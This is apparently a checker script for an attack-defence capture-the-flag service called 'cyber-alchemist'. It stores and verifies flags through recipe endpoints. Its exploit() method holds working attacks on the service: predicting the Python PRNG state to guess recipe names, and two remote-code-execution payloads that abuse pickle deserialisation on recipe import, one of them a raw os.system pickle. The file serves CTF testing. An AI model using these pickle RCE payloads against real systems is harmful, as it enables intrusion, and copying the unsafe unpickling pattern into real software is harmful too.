#!/usr/bin/env python3

import random, string, re, binascii, subprocess
from ast import literal_eval
from pickle import dumps

from enochecker import BaseChecker, BrokenServiceException, assert_equals, run

from app import base64, hex, url, unicode, Recipe


class CyberAlchemistChecker(BaseChecker):
    service_name = 'cyber-alchemist'
    flag_count  = 1
    noise_count = 1
    havoc_count = 0

    """
    Change the methods given here, then simply create the class and .run() it.
    Magic.

    A few convenient methods and helpers are provided in the BaseChecker.
    ensure_bytes ans ensure_unicode to make sure strings are always equal.

    As well as methods:
    self.connect() connects to the remote server.
    self.get and self.post request from http.
    self.team_db is a dict that stores its contents to filesystem. (call .persist() to make sure)
    self.readline_expect(): fails if it's not read correctly

    To read the whole docu and find more goodies, run python -m pydoc enochecker
    (Or read the source, Luke)
    """

    # internal (in docker)
    port = 80 # The port will automatically be picked up as default by self.connect and self.http.

    f = open('words.txt', 'r')
    words = f.read().splitlines()
    f.close()
    connectors = ["-", " ", "", "_"]
    operations = ["base64", "hex", "url", "unicode"]

    def putflag(self):  # type: () -> None

        if random.random() < 0.33:
            # In 1/3 of all cases, generate a random recipe name from the server
            r = self.http_post("/recipes/create")
            try:
                tag = r.headers['Location'].split('/')[-1]
            except Exception as e:
                raise BrokenServiceException(
                    "Creating recipe failed. Exception: " + repr(e)
                )
            self.debug("Created recipe with name: " + tag)
        else:
            # dummy request to only proceed if service is up
            self.http_get("/")
            # generating recipe name locally
            random_tag_operation = random.choice([
                "random-string",
                "random-word",
                "random-word-double",
                "random-word-string",
                "random-attack",
            ])
            if random_tag_operation == "random-string":
                tag = ''.join(
                    random.choice(string.ascii_uppercase + string.digits + string.ascii_letters)
                    for _ in range(random.randint(4, 20))
                )
            elif random_tag_operation == "random-word":
                tag = random.choice(self.words) + random.choice(self.connectors) + str(random.randint(0, 40))
            elif random_tag_operation == "random-word-double":
                tag = random.choice(self.words) + random.choice(self.connectors) + random.choice(self.words)
            elif random_tag_operation == "random-word-string":
                tag = random.choice(self.words) + random.choice(self.connectors) + ''.join(
                    random.choice(string.ascii_uppercase + string.digits + string.ascii_letters)
                    for _ in range(random.randint(4, 20))
                )
            elif random_tag_operation == "random-attack":
                tag = ''.join(
                    random.choice(string.ascii_uppercase) * 4
                    for _ in range(random.randint(1, 10))
                )

            self.debug("Used operation {} to generate recipe name {}".format(random_tag_operation, tag))

        # check if any ingredients exist yet. if yes, delete the recipe beforehand.
        r = self.http_get("/recipe/{}".format(tag))
        if 'Add ingredients to edit steps' not in r.text:
            self.http_get("/recipe/{}/delete".format(tag))

        # choose random ingredients
        ingredients = [random.choice(self.operations) for _ in range(0, random.randint(0, 5))]

        # choose flag destination
        flag_destination = random.choice(["base_ingredient", "potion"])
        self.debug("Flag destination: {}".format(flag_destination))

        # store data for checker
        data = {"tag": tag, "ingredients": ingredients, "flag_destination": flag_destination}
        self.team_db[self.flag] = data

        base_ingredient = self.flag

        if flag_destination == "base_ingredient":
            # flag is in base ingredient (perform encode operations)
            ingredients_data = {
                "base_ingredient": base_ingredient
            }
            self.http_post("/recipe/" + data["tag"], data=ingredients_data)

            for ingredient in data["ingredients"]:
                self.http_get("/recipe/" + data["tag"] + "/" + ingredient + "/encode")

        elif flag_destination == "potion":
            # flag is in potion (perform encode locally and decode in the recipe)
            for ingredient in reversed(data["ingredients"]):
                # use functions of the app helper module
                self.debug("Executing ingredient {}".format(ingredient))
                base_ingredient = getattr(globals()[ingredient], 'encode')(base_ingredient)
                self.debug("Modified base ingredient: {}".format(base_ingredient))
            ingredients_data = {
                "base_ingredient": base_ingredient
            }
            self.http_post("/recipe/" + data["tag"], data=ingredients_data)

            for ingredient in data["ingredients"]:
                self.http_get("/recipe/" + data["tag"] + "/" + ingredient + "/decode")

        print('putting flag is done')

    def getflag(self):  # type: () -> None

        try:
            data = self.team_db[self.flag]
        except KeyError as ex:
            raise BrokenServiceException(
                "Inconsistent Database: Couldn't get data for team/flag ({})".format(self.flag))

        r = self.http_get("/recipe/" + data["tag"])

        try:
            if data['flag_destination'] == 'base_ingredient':
                flag = re.findall('<input class=\"input\" type=\"text\" name=\"base_ingredient\"[\\n\\t\s]+value=\"([^\"]+)\">', r.text, re.S)[0]
            elif data['flag_destination'] == "potion":
                flag = re.findall('<code class="language-javascript">([^<]+)</code>', r.text, re.S)[0]
        except Exception:
            raise BrokenServiceException("Could not fetch flag from {} field.".format(data['flag_destination']))

        if flag != self.flag:
            raise BrokenServiceException(
                "Incorrect flag in {} field (expected '{}', but found '{}')".format(data['flag_destination'], self.flag, flag))

    def putnoise(self):  # type: () -> None
        """
        This method stores noise in the service. The noise should later be recoverable.
        The difference between noise and flag is, tht noise does not have to remain secret for other teams.
        This method can be called many times per round. Check how often using self.flag_idx.
        On error, raise an EnoException.
        :raises EnoException on error
        :return this function can return a result if it wants
                if nothing is returned, the service status is considered okay.
                the preferred way to report errors in the service is by raising an appropriate enoexception
        """
        # create recipe
        r = self.http_post("/recipes/create")
        try:
            recipe_name = r.headers['Location'].split('/')[-1]
        except Exception as e:
            raise BrokenServiceException(
                "Creating recipe failed. Exception: " + repr(e)
            )
        self.debug("Created recipe with name: " + recipe_name)

        # put noise as base ingredient
        self.http_post("/recipe/{}".format(recipe_name), data={"base_ingredient": self.noise})

        # choose random ingredients
        ingredients = [random.choice(self.operations) for _ in range(0, random.randint(0, 5))]

        # apply ingredients and calculate test potion value locally
        test_potion = self.noise
        for ingredient in ingredients:
            self.http_get("/recipe/{}/{}/encode".format(recipe_name, ingredient))
            test_potion = getattr(globals()[ingredient], 'encode')(test_potion)

        # check if potion was correctly calculated
        r = self.http_get("/recipe/{}".format(recipe_name))
        potion_re = re.findall('<code class="language-javascript">([^<]+)</code>', r.text, re.S)
        if len(potion_re) == 0:
            raise BrokenServiceException("Potion field is missing in HTML response")
        potion = potion_re[0]
        if potion != test_potion:
            raise BrokenServiceException(
                "Incorrect noise potion (expected '{}', but found '{}')".format(test_potion, potion)
            )
        self.debug("Recipe noise potion: " + potion)

        # export recipe
        r = self.http_get("/recipe/{}/export".format(recipe_name))
        self.debug("Export recipe request headers: " + str(r.headers))
        recipe_file = r.content
        recipe_file_content_type = r.headers['Content-Type']
        self.debug("Export recipe content type: " + recipe_file_content_type)
        try:
            recipe_file_name = re.findall('attachment; filename=(.+)', r.headers['Content-Disposition'], re.S)[0]
        except Exception:
            raise BrokenServiceException("Response did not have the correct content disposition header.")
        self.debug("Export recipe filename: " + recipe_file_name)

        # delete recipe
        self.http_get("/recipe/{}/delete".format(recipe_name))

        # check if recipe was really deleted
        r = self.http_get("/recipe/{}".format(recipe_name))
        base_ingredient_re = re.findall('<input class=\"input\" type=\"text\" name=\"base_ingredient\"[\\n\\t\s]+value=\"([^\"]+)\">', r.text, re.S)
        if len(base_ingredient_re) > 0:
            raise BrokenServiceException("Base ingredient should be empty after deleting, but was '{}'".format(base_ingredient_re[0]))

        data = {
            "recipe_name": recipe_name,
            "recipe_file_name": recipe_file_name,
            "recipe_file": binascii.hexlify(recipe_file).decode(),  # convert file to hex-string
            "recipe_file_content_type": recipe_file_content_type,
            "potion": potion
        }
        self.team_db[self.noise] = data

    def getnoise(self):  # type: () -> None
        """
        This method retrieves noise in the service.
        The noise to be retrieved is inside self.flag
        The difference between noise and flag is, tht noise does not have to remain secret for other teams.
        This method can be called many times per round. Check how often using flag_idx.
        On error, raise an EnoException.
        :raises EnoException on error
        :return this function can return a result if it wants
                if nothing is returned, the service status is considered okay.
                the preferred way to report errors in the service is by raising an appropriate enoexception
        """

        try:
            data = self.team_db[self.noise]
        except KeyError:
            raise BrokenServiceException(
                "Inconsistent Database: Couldn't get data for team/noise ({})".format(self.noise)
            )

        self.debug("Import recipe with name '{}', filename '{}' and content type '{}'".format(
            data["recipe_name"],
            data["recipe_file_name"],
            data["recipe_file_content_type"]
        ))
        # import recipe
        recipe_file = {
            'recipe': (
                data["recipe_file_name"],
                binascii.unhexlify(data["recipe_file"].encode()),  # recover file from hex-string
                data["recipe_file_content_type"],
            )
        }
        r = self.http_post("/recipes/import", files=recipe_file)
        self.debug("Import recipe response headers: " + str(r.headers))
        error_re = re.findall('<div class="message-body">(.+?)</div>', r.text, re.S)
        if len(error_re) > 0:
            self.debug("Import recipe error: " + error_re[0])

        # check if recipe was correctly imported
        r = self.http_get("/recipe/{}".format(data["recipe_name"]))

        # check noise
        noise_re = re.findall('<input class=\"input\" type=\"text\" name=\"base_ingredient\"[\\n\\t\s]+value=\"([^\"]+)\">', r.text, re.S)
        if len(noise_re) == 0:
            raise BrokenServiceException("Base ingredient field missing or empty in HTML response.'")
        noise = noise_re[0]
        if noise != self.noise:
            raise BrokenServiceException(
                "Incorrect noise (expected '{}', but found '{}')".format(self.noise, noise)
            )

        # check potion
        potion_re = re.findall('<code class="language-javascript">([^<]+)</code>', r.text, re.S)
        if len(potion_re) == 0:
            raise BrokenServiceException("Potion field is missing in HTML response.")
        potion = potion_re[0]
        if potion != data["potion"]:
            raise BrokenServiceException(
                "Incorrect noise potion (expected '{}', but found '{}')".format(data["potion"], potion)
            )

    def havoc(self):  # type: () -> None
        """
        This method unleashes havoc on the app -> Do whatever you must to prove the service still works. Or not.
        On error, raise an EnoException.
        :raises EnoException on Error
        :return This function can return a result if it wants
                If nothing is returned, the service status is considered okay.
                The preferred way to report Errors in the service is by raising an appropriate EnoException
        """
        pass

    def exploit(self):
        ######################################
        # Exploit 1: Predicting random state #
        ######################################
        recipe_name = 'exploit_' + ''.join(random.choice(string.ascii_letters) for _ in range(10))
        self.http_get("/recipe/{}/random/getstate".format(recipe_name))
        r = self.http_get("/recipe/{}".format(recipe_name))
        # check result
        random_state = re.findall('<code class="language-javascript">([^<]+)</code>', r.text, re.S)[0]
        self.debug('random state: ' + random_state)
        prng = random.Random()
        prng.setstate(literal_eval(random_state))
        predicted_recipe_name = ''.join(prng.choice(string.ascii_letters) for i in range(prng.randint(20,40)))
        # simulate request from other user (e.g. a checker's putflag)
        r = self.http_post("/recipes/create")
        recipe_name = r.headers['Location'].split('/')[-1]
        if predicted_recipe_name != recipe_name:
            raise BrokenServiceException(
                "Exploit #1 not possible: Random state not predictable (predicted '{}', but got '{}')".format(predicted_recipe_name, recipe_name)
            )
        #########################################
        # Exploit 2: RCE via recipe ingredients #
        #########################################
        recipe_name = 'exploit_' + ''.join(random.choice(string.ascii_letters) for _ in range(10))
        # craft malicious recipe file
        exploit_recipe = Recipe(
            name=recipe_name,
            potion=['echo', 'You got hacked!'],
            ingredients=[subprocess.check_output]
        )
        # import recipe
        recipe_file = {
            'recipe': (
                recipe_name + ".recipe",
                dumps(exploit_recipe),
                "application/octet-stream",
            )
        }
        self.http_post("/recipes/import", files=recipe_file)
        r = self.http_get("/recipe/{}".format(recipe_name))
        # check result
        result = re.findall('<code class="language-javascript">([^<]+)</code>', r.text, re.S)[0]
        if result != "b&#39;You got hacked!\\n&#39;":
            raise BrokenServiceException(
                "Exploit #2 not possible: Imported recipe ingredient not executed (expected 'b&#39;You got hacked\\n&#39;', but got '{}')".format(result)
            )
        ####################################
        # Exploit 3: RCE via pickle import #
        ####################################
        # craft malicious recipe file
        exploit_recipe = "cos\nsystem\n(S'echo \"You got hacked!\" > /app/static/exploit.txt'\ntR.'\ntR."
        # import recipe
        recipe_file = {
            'recipe': (
                "exploit.recipe",
                exploit_recipe,
                "application/octet-stream",
            )
        }
        self.http_post("/recipes/import", files=recipe_file)
        r = self.http_get("/static/exploit.txt")
        # check result
        if r.text != "You got hacked!\n":
            raise BrokenServiceException(
                "Exploit #3 not possible: No RCE on pickle import (expected 'You got hacked!\\n', but got '{}')".format(r.text)
            )


app = CyberAlchemistChecker.service  # This can be used for uswgi.
if __name__ == "__main__":
    run(CyberAlchemistChecker)
